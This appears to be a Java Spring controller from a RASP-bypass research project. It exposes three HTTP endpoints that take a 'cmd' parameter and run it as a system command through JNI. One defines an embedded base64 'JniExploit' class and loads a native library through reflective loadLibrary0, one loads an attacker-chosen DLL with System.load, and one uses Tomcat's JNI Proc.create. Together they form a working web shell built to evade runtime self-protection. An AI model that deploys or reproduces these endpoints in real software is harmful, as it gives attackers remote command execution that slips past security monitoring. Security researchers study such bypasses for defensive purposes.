package com.example.raspbypass.controller;

import org.apache.tomcat.jni.Library;
import org.apache.tomcat.jni.Pool;
import org.apache.tomcat.jni.Proc;
import org.apache.tomcat.jni.Procattr;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.File;
import java.io.IOException;
import java.lang.reflect.Method;
import java.util.Objects;

import static com.example.raspbypass.Util.Util.LOADER;
import static com.example.raspbypass.Util.Util.base64Decode;

@Controller
@RequestMapping("/bypass1")
public class Bypass1 {
    // JNI
    //reference: https://javasec.org/javase/JNI/
    private static final String COMMAND_CLASS_NAME = "JniExploit";
    private static final String COMMAND_CLASS_BYTES = "yv66vgAAADQADwoAAwAMBwANBwAOAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEABGV4ZWMBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAClNvdXJjZUZpbGUBAA9KbmlFeHBsb2l0LmphdmEMAAQABQEACkpuaUV4cGxvaXQBABBqYXZhL2xhbmcvT2JqZWN0ACEAAgADAAAAAAACAAEABAAFAAEABgAAAB0AAQABAAAABSq3AAGxAAAAAQAHAAAABgABAAAAAQEBAAgACQAAAAEACgAAAAIACw==";
    private static Class COMMAND_CLASS = LOADER.defineClass0(COMMAND_CLASS_NAME, base64Decode(COMMAND_CLASS_BYTES), 0, base64Decode(COMMAND_CLASS_BYTES).length, null);;



    @GetMapping("/classloader")
    public void jni1(HttpServletRequest request, HttpServletResponse response) {
        String cmd = request.getParameter("cmd");

        ClassLoader loader = new ClassLoader(this.getClass().getClassLoader()) {
            @Override
            protected Class<?> findClass(String name)  {
                try {
                    return super.findClass(name);
                } catch (ClassNotFoundException e) {
                    return defineClass(COMMAND_CLASS_NAME, base64Decode(COMMAND_CLASS_BYTES), 0, base64Decode(COMMAND_CLASS_BYTES).length);
                }
            }
        };
        try {
            String jniPath = request.getParameter("jnipath");
            if (Objects.equals(jniPath, "")) {
                jniPath = "jni/cmd.dll";
            }
            File jniFile = new File(jniPath);
            Method loadLibrary0Method = ClassLoader.class.getDeclaredMethod("loadLibrary0", Class.class, File.class);
            loadLibrary0Method.setAccessible(true);
            loadLibrary0Method.invoke(loader,
                    COMMAND_CLASS, jniFile);
            Object obj = COMMAND_CLASS.newInstance();
            Method exec = COMMAND_CLASS.getMethod("exec", String.class);
            String content = (String) exec.invoke(obj, cmd);
            response.getWriter().write(content);
        } catch (Exception e) {
            try {
                response.getWriter().write(e.toString());
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }

    @GetMapping("/system_load")
    public void Jni2(HttpServletRequest request, HttpServletResponse response) {
        String cmd = request.getParameter("cmd");
        String jniPath = request.getParameter("jnipath");
        if (Objects.equals(jniPath, "")) {
            jniPath = "jni/cmd2.dll";
        }
        try {
            // load命令执行类
            System.load(System.getProperty("user.dir") + "/" + jniPath);
            Object obj = COMMAND_CLASS.newInstance();
            Method exec = COMMAND_CLASS.getMethod("exec", String.class);
            String content = (String) exec.invoke(obj, cmd);
            response.getWriter().write(content);
        } catch (Exception e) {
            try {
                response.getWriter().write(e.toString());
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }


    @GetMapping("/tomcat-jni")
    public void Jni3(HttpServletRequest request, HttpServletResponse response) {
//        System.setProperty("java.library.path","jni");
        String[] strs = request.getParameterValues("cmd");
        String[] args = new String[strs.length - 1];

        for (int i = 0; i < args.length; i++) {
            args[i] = strs[i + 1];
        }
        try {
            Library.initialize(null);
            long pool = Pool.create(0);
            long proc = Proc.alloc(pool);
            Proc.create(proc, strs[0], args, new String[]{}, Procattr.create(pool), pool);
            response.getWriter().write("命令执行成功");
        } catch (Exception e) {
            try {
                response.getWriter().write(e.toString());
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }


}
